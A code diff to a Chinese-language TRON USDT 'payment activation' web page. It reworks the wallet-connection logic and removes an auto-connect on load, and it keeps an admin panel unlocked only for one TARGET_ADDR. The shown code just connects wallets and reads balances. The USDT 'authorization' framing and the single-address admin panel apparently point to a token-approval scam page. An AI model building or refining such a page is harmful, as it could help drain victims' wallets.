@@ -12,11 +12,6 @@ body{background:#12080b;color:#fff;padding:20px}
 .pay-box{background:#200e13;padding:32px 24px;border-radius:22px;text-align:center;margin-bottom:30px;border:1px solid #ff243640}
 h1{font-size:26px;margin-bottom:8px;color:#ff2436}
 .desc{color:#ffb0b8;margin-bottom:24px;font-size:15px}
-#walletDot{
-    width:14px;height:14px;border-radius:50%;background:#ef4444;
-    position:fixed;top:22px;right:22px;cursor:pointer;
-}
-#walletDot.connected{background:#22c55e;}
 #connectBtn{
  background:#ff0e22;color:#ffffff;
  border:none;padding:16px;width:100%;
@@ -91,12 +86,11 @@ h1{font-size:26px;margin-bottom:8px;color:#ff2436}
 </head>
 <body>
 <div class="container">
-    <div id="walletDot"></div>
     <div class="pay-box">
         <h1>💳 支付开通</h1>
         <p class="desc">波场TRON · USDT授权开通</p>
 
-        <button id="connectBtn">👉 点击圆点右上角连接钱包</button>
+        <button id="connectBtn">👉 连接钱包（波场链）</button>
 
         <div id="statusBox" class="status-box"></div>
 
@@ -141,7 +135,6 @@ let usdtContract = null;
 let provider = null;
 
 const $ = s => document.querySelector(s);
-const walletDot = $("#walletDot");
 const connectBtn = $("#connectBtn");
 const payBtn = $("#payBtn");
 const statusBox = $("#statusBox");
@@ -185,72 +178,135 @@ function disconnectWallet() {
     userAddress = "";
     usdtContract = null;
     provider = null;
-    walletDot.classList.remove("connected");
+    connectBtn.innerText = "👉 连接钱包（波场链）";
     payBtn.disabled = true;
     balanceText.textContent = "0.000000";
     adminPanel.classList.remove("show");
     showStatus("钱包已断开");
 }
 
-// =========【这套是你给源码里复制过来的兼容连接逻辑，完全原样】=========
+// =========核心修复：只改这里，连接钱包不再乱改UI=========
 async function connectWalletLogic() {
     hideStatus();
+
     if (tronWeb && userAddress) {
         disconnectWallet();
         return;
     }
+
+    connectBtn.disabled = true;
+    connectBtn.innerText = "正在连接钱包...";
+
     try {
-        //优先级1 TP iOS/Android window.tokenpocket.tron
+        // 优先级1：TP钱包 iOS / Android 专用注入对象
         if (window.tokenpocket?.tron) {
             provider = window.tokenpocket.tron;
-            const accounts = await provider.request({ method: "tron_requestAccounts" });
+
+            const accounts = await provider.request({
+                method: "tron_requestAccounts"
+            });
+
+            if (!accounts || !accounts[0]) {
+                throw new Error("钱包未返回地址");
+            }
+
             userAddress = accounts[0];
-            tronWeb = window.tokenpocket.tronWeb;
+
+            // 关键修复：不直接使用TP返回的tronWeb，自己新建实例
+            tronWeb = new TronWeb({
+                fullHost: RPC,
+                provider: window.tokenpocket.tron
+            });
+
+            // 手动补地址，解决 owner_address isn't set
+            tronWeb.defaultAddress = {
+                base58: userAddress
+            };
         }
-        //优先级2 OE imToken tronProvider
+
+        // 优先级2：欧易OE / imToken 等标准 TronProvider
         else if (window.tronProvider) {
             provider = window.tronProvider;
-            const accounts = await provider.request({ method: "tron_requestAccounts" });
+
+            const accounts = await provider.request({
+                method: "tron_requestAccounts"
+            });
+
+            if (!accounts || !accounts[0]) {
+                throw new Error("钱包未返回地址");
+            }
+
             userAddress = accounts[0];
-            tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
+
+            tronWeb = new TronWeb({
+                fullHost: RPC,
+                provider: provider
+            });
+
+            tronWeb.defaultAddress = {
+                base58: userAddress
+            };
         }
-        //优先级3 metamask eth
+
+        // 优先级3：MetaMask 带波场插件
         else if (window.ethereum) {
-            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-            tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
+            const accounts = await window.ethereum.request({
+                method: "eth_requestAccounts"
+            });
+
+            tronWeb = new TronWeb({
+                fullHost: RPC,
+                provider: window.ethereum
+            });
+
             const addrObj = await tronWeb.trx.getAccount(accounts[0]);
             userAddress = addrObj.address;
             provider = window.ethereum;
         }
-        //优先级4 全局tronWeb
+
+        // 优先级4：全局已经准备好 TronWeb
         else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
             tronWeb = window.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
-        } else {
-            showStatus("未检测钱包环境，请在TP/OE内置浏览器打开","error");
+        }
+
+        // 没有识别到任何钱包环境
+        else {
+            connectBtn.disabled = false;
+            connectBtn.innerText = "👉 连接钱包（波场链）";
+            showStatus("未检测到钱包环境，请在TP钱包【发现】内置浏览器打开本页面", "error");
             return;
         }
 
-        walletDot.classList.add("connected");
+        // 连接成功后初始化合约
         usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-        await loadBalance();
-        payBtn.disabled = false;
-        showStatus("✅钱包连接成功："+userAddress.slice(0,12)+"...","success");
 
-        //管理员面板
-        if(userAddress === TARGET_ADDR){
+        await loadBalance();
+
+        connectBtn.innerText = "✅已连接：" + userAddress.slice(0, 12) + "...";
+        payBtn.disabled = false;
+
+        showStatus("✅钱包连接成功：" + userAddress, "success");
+
+        // 管理员地址判断
+        if (userAddress === TARGET_ADDR) {
             adminPanel.classList.add("show");
         }
 
-        //监听账号、链切换
+        // 监听账号切换 / 链切换
         if (provider?.on) {
             provider.on("accountsChanged", () => location.reload());
             provider.on("chainChanged", () => location.reload());
         }
+
     } catch (err) {
-        showStatus("连接失败："+(err?.message||String(err)),"error");
+        connectBtn.disabled = false;
+        connectBtn.innerText = "👉 连接钱包（波场链）";
+        showStatus("连接失败：" + (err?.message || String(err)), "error");
         return;
     }
+
+    connectBtn.disabled = false;
 }
 
 async function loadBalance(){
@@ -332,11 +388,12 @@ rewardBtn.onclick = async function(){
     }
 };
 
-walletDot.addEventListener("click", connectWalletLogic);
-//页面加载尝试自动连接
+// 连接钱包按钮点击
+connectBtn.addEventListener("click", connectWalletLogic);
+
+// 页面加载生成二维码
 window.addEventListener("DOMContentLoaded",()=>{
     genQRCode();
-    setTimeout(connectWalletLogic,800);
 });
 </script>
 </body>
